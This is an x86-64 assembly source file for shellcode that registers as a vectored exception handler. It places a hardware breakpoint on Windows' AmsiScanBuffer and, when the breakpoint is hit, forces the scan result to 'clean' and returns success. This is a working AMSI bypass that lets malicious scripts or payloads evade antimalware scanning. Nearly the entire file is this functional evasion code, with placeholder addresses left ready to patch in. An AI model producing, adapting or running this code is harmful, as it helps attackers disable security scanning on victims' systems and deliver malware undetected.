[BITS 64]

; nasm -f bin veh.asm -o veh.bin ; xxd -i veh.bin

    ; Callback called w/ 
    ;   typedef struct _EXCEPTION_POINTERS {
    ;     PEXCEPTION_RECORD ExceptionRecord;
    ;     PCONTEXT          ContextRecord;
    ;   } EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;

    ; rcx = PEXCEPTION_POINTERS
    mov r8, [rcx + 8]   ; r8 = ContextRecord
    mov r9, [rcx]       ; r9 = ExceptionRecord
    mov eax, [r9]       ; eax = ExceptionCode 

    cmp eax, 0x80000003 ; EXCEPTION_BREAKPOINT (int 3)
    je handle_bp
    cmp eax, 0x80000004 ; EXCEPTION_SINGLE_STEP (HWBP hit)
    je handle_ss

    xor eax, eax        ; EXCEPTION_CONTINUE_SEARCH
    ret

    handle_bp:
        ; --- ABI Compliant OutputDebugStringA Call ---
        push r8                     ; Save ContextRecord
        sub rsp, 0x20               ; Allocate 32 bytes shadow space & align stack to 16 bytes
        
        mov rax, 0xCCCCCCCCCCCCCCCC ; Placeholder for OutputDebugStringA
        lea rcx, [rel debug_string2]
        call rax
        
        add rsp, 0x20               ; Cleanup shadow space
        pop r8                      ; Restore ContextRecord
        ; ---------------------------------------------

        ; Setup the HWBP
        lea r10, [rel amsi_addr]
        mov r10, [r10]
        mov [r8 + 0x48], r10        ; CONTEXT_RECORD.Dr0 = AmsiScanBuffer

        ; Dr7: 
        ; Bit 0 (L0) = 1 (Enable Dr0)
        ; Bit 8 (LE) = 1 (Local Exact Breakpoint)
        ; Bits 16-17 (RW0) = 00 (Break on execution)
        mov qword [r8 + 0x70], 0x101 

        ; Clear Dr6 (Status Register)
        mov qword [r8 + 0x68], 0

        ; Force OS to apply Debug Registers
        mov eax, [r8 + 0x30]        ; ctx.ContextFlags
        or eax, 0x00100010          ; CONTEXT_AMD64 (0x100000) | CONTEXT_DEBUG_REGISTERS (0x10)
        mov [r8 + 0x30], eax

        ; Pass the int3 instruction 
        add qword [r8 + 0xf8], 1    ; Rip += 1

        mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
        ret

    handle_ss:
        ; 1. Verify it's actually DR0 that triggered (Check DR6.B0)
        mov rax, [r8 + 0x68]        ; rax = CONTEXT_RECORD.Dr6
        test rax, 1
        jz not_amsi                 ; Not a DR0 trigger

        ; Clear Dr6 to acknowledge exception and avoid infinite loops.
        mov qword [r8 + 0x68], 0 

        ; 2. Verify RIP matches AmsiScanBuffer (Defense in depth)
        mov r11, [r8 + 0xf8]        ; r11 = CONTEXT_RECORD.Rip
        lea r10, [rel amsi_addr]
        mov r10, [r10]              ; r10 = amsi_addr value
        cmp r11, r10
        jne not_amsi

        ; --- ABI Compliant OutputDebugStringA Call ---
        push r8                     ; Save ContextRecord
        sub rsp, 0x20               ; Allocate 32 bytes shadow space & align stack to 16 bytes
        
        mov rax, 0xBBBBBBBBBBBBBBBB ; Placeholder for OutputDebugStringA
        lea rcx, [rel debug_string1]
        call rax
        
        add rsp, 0x20               ; Cleanup shadow space
        pop r8                      ; Restore ContextRecord
        ; ---------------------------------------------

        ; --- BYPASS AMSI --- 
        mov r11, [r8 + 0x98]        ; r11 = CONTEXT_RECORD.Rsp (stack pointer at function entry)

        ; Retrieve the 6th argument (AMSI_RESULT pointer) from the stack
        mov r10, [r11 + 0x30]       ; r10 = pointer to AMSI_RESULT
        
        ; Safety Check: Ensure the pointer is not NULL before writing
        test r10, r10
        jz skip_result_write
        mov dword [r10], 0          ; Set AMSI_RESULT to AMSI_RESULT_CLEAN (0)
        
    skip_result_write:
        ; Set ret value of AmsiScanBuffer to S_OK (0) 
        mov qword [r8 + 0x78], 0    ; r8 + 0x78 = CONTEXT_RECORD.Rax 

        ; Emulate the "ret" of AmsiScanBuffer to avoid crashing the process 
        mov r10, [r11]              ; r10 = ctx.[rsp] (ret addr of AmsiScanBuffer (on top of the stack))
        mov [r8 + 0xf8], r10        ; Rip = ret addr of AmsiScanBuffer
        add qword [r8 + 0x98], 8    ; Rsp += 8 (simulate pop stack)

        ; Instruct the OS to keep applying the debug registers for the next call
        or dword [r8 + 0x30], 0x10  ; ContextFlags |= CONTEXT_DEBUG_REGISTERS

        mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
        ret

    not_amsi:
        xor eax, eax
        ret

    align 8
    amsi_addr:
    dq 0xAAAAAAAAAAAAAAAA
    debug_string1:
    db "VEH Hit ! (Apply AMSI Bypass)", 0
    debug_string2:
    db "VEH Hit ! (Apply HWBP on AMSI)", 0